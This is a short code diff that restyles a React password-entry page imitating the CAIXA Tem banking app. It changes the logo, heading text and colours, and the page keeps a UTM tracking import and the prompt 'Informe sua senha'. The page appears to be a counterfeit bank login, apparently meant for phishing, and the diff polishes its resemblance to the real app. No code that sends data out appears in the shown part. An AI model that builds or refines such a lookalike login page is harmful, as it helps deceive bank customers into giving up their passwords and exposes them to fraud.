@@ -3,7 +3,7 @@ import { useLocation } from 'wouter';
 import { motion } from 'framer-motion';
 import { Eye, EyeOff } from 'lucide-react';
 import { prepareUrlWithParams } from '../lib/utmHandler';
-import caixaTemLogo from '@assets/logo-caixa-tem.png';
+import caixaLogo from '@assets/caixa tem logo.webp';
 import helpIcon from '@assets/icone-ajuda webp.webp';
 
 export default function LoginSenha() {
@@ -50,20 +50,20 @@ export default function LoginSenha() {
 
   return (
     <div className="min-h-screen w-full flex flex-col bg-white text-[#0079c0]">
-      <div className="w-full p-8 flex flex-col items-center">
-        {/* Logo CAIXA TEM */}
+      <div className="w-full p-5 flex flex-col items-center">
+        {/* Logo CAIXA */}
         <img 
-          src={caixaTemLogo} 
-          alt="CAIXA Tem" 
-          className="w-48 h-auto" 
+          src={caixaLogo} 
+          alt="CAIXA" 
+          className="w-40 h-auto" 
         />
-        <h2 className="text-[#0079c0] text-xl font-normal mt-2">
-          Entrar no CAIXA Tem
+        <h2 className="text-[#0079c0] text-xl font-normal mt-1">
+          Aplicativo Caixa Tem
         </h2>
       </div>
       
       <div className="flex-1 px-6 flex flex-col">
-        <p className="text-[#0079c0] text-lg font-normal leading-7 mb-10">
+        <p className="text-[#666666] text-lg font-normal leading-7 mb-6">
           Informe sua senha:
         </p>
         
